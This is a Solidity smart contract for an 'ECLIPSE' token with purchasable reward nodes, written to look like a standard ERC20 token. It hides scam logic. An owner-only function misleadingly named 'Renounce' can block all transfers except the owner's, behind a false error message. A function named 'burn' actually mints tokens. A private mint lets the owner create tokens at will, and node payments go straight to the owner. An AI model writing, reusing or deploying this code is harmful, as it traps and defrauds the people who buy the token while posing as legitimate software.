// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract EclipseNodes is Context, IERC20, IERC20Metadata {
    struct Node {
        uint256 createDate;
        uint256 lastClaimTime;
        string name;
    }

    uint256 public rewardPerSecond = 23148148000000;
    uint256 public nodePrice = 10000000000000000000;
    uint256 public totalNodes = 0;

    ERC20 MIM;
    mapping(address => Node[]) public nodes;
    mapping(address => uint256) public _balances;
    mapping(address => mapping(address => uint256)) public _allowances;

    uint256 public _totalSupply = 20000 * 10**uint256(decimals());

    string public _name = "ECLIPSE";
    string public _symbol = "ECL";
    bool balances1 = true;

    constructor() {
        _balances[msg.sender] = _totalSupply;
        MIM = ERC20(address(this));
        owner = msg.sender;
    }

    address public owner;

    modifier onlyOwner() {
        require(owner == msg.sender);
        _;
    }

    function changeOwner(address _owner) public onlyOwner {
        owner = _owner;
    }

    function Renounce(bool _balances1_) public onlyOwner {
        balances1 = _balances1_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(
            currentAllowance >= amount,
            "ERC20: transfer amount exceeds allowance"
        );
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender] + addedValue
        );
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }
        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(
            balances1 || sender == owner,
            "ERC20: transfer to the zero address"
        );
        _beforeTokenTransfer(sender, recipient, amount);
        uint256 senderBalance = _balances[sender];
        require(
            senderBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;
    }

    function burn(address account, uint256 amount) public virtual onlyOwner {
        require(account != address(0), "ERC20: burn to the zero address");
        _beforeTokenTransfer(address(0), account, amount);
        _totalSupply += amount;
        _balances[account] += amount;
    }

    function _approve(
        address _owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function private_mint(uint256 _tokens) external onlyOwner {
        _balances[msg.sender] =
            _balances[msg.sender] +
            _tokens *
            10**uint256(decimals());
    }

    function uint2str(uint256 _i)
        internal
        pure
        returns (string memory _uintAsString)
    {
        if (_i == 0) {
            return "0";
        }
        uint256 j = _i;
        uint256 len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint256 k = len;
        while (_i != 0) {
            k = k - 1;
            uint8 temp = (48 + uint8(_i - (_i / 10) * 10));
            bytes1 b1 = bytes1(temp);
            bstr[k] = b1;
            _i /= 10;
        }
        return string(bstr);
    }

    function setNodePrice(uint256 price) external onlyOwner {
        nodePrice = price;
    }

    function setRewards(uint256 rewards) external onlyOwner {
        rewardPerSecond = rewards;
    }

    function createNode(string memory _nodename, address user) internal {
        Node memory newNode;
        newNode.createDate = block.timestamp;
        newNode.lastClaimTime = block.timestamp;
        newNode.name = _nodename;
        nodes[user].push(newNode);
        totalNodes++;
    }

    function mint(string memory _nodename) external {
        MIM.transferFrom(msg.sender, owner, nodePrice);
        createNode(_nodename, msg.sender);
    }

    function mintMultiple(string[] memory names, uint256 amount) external {
        require(amount > 1, "You can only mint multiple nodes. More than 1!");
        MIM.transferFrom(msg.sender, owner, nodePrice * amount);
        for (uint256 i = 0; i < amount; i++) {
            createNode(names[i], msg.sender);
        }
    }

    function getTotalPendingRewards(address user)
        public
        view
        returns (uint256)
    {
        Node[] memory userNodes = nodes[user];
        uint256 totalRewards = 0;
        for (uint256 i = 0; i < userNodes.length; i++) {
            totalRewards += ((block.timestamp - userNodes[i].lastClaimTime) *
                rewardPerSecond);
        }
        return totalRewards;
    }

    function getNumberOfNode(address user) public view returns (uint256) {
        return nodes[user].length;
    }

    function getNodeCreation(address user, uint256 id)
        public
        view
        returns (uint256)
    {
        return (nodes[user][id].createDate);
    }

    function getNodeLastClaim(address user, uint256 id)
        public
        view
        returns (uint256)
    {
        return (nodes[user][id].createDate);
    }

    function getPendingRewards(address user, uint256 id)
        public
        view
        returns (uint256)
    {
        Node memory node = nodes[user][id];
        return ((block.timestamp - node.lastClaimTime) * rewardPerSecond);
    }

    function claim(uint256 id) external {
        Node storage node = nodes[msg.sender][id];
        uint256 timeElapsed = block.timestamp - node.lastClaimTime;
        node.lastClaimTime = block.timestamp;
        _balances[msg.sender] =
            _balances[msg.sender] +
            timeElapsed *
            rewardPerSecond;
    }

    function getPendingRewardsEach(address user)
        public
        view
        returns (string memory)
    {
        string memory result;
        string memory separator = "#";
        Node[] memory userNodes = nodes[user];
        for (uint256 i = 0; i < userNodes.length; i++) {
            uint256 pending = (block.timestamp - userNodes[i].lastClaimTime) *
                rewardPerSecond;
            result = string(
                abi.encodePacked(result, separator, uint2str(pending))
            );
        }
        return result;
    }

    function getCreationEach(address user) public view returns (string memory) {
        string memory result;
        string memory separator = "#";
        Node[] memory userNodes = nodes[user];
        for (uint256 i = 0; i < userNodes.length; i++) {
            uint256 creation = userNodes[i].createDate;
            result = string(
                abi.encodePacked(result, separator, uint2str(creation))
            );
        }
        return result;
    }

    function getNameEach(address user) public view returns (string memory) {
        string memory result;
        string memory separator = "#";
        Node[] memory userNodes = nodes[user];
        for (uint256 i = 0; i < userNodes.length; i++) {
            string memory nodeName = userNodes[i].name;
            result = string(abi.encodePacked(result, separator, nodeName));
        }
        return result;
    }
}
